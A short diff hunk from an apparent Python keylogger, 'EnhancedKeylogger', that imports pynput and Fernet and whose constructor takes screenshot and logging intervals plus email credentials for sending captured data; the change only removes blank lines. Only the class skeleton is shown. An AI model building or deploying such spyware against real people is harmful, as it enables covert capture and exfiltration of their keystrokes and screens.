@@ -30,7 +30,6 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 class EnhancedKeylogger:
-
     def __init__(self, log_interval=300, screenshot_interval=60,
                  from_email=None, password=None, to_email=None,
                  encryption_key=None):
@@ -242,4 +241,3 @@ if __name__ == "__main__":
         keylogger.start()
     except Exception as e:
         logging.critical(f"Initialization failed: {e}")
-
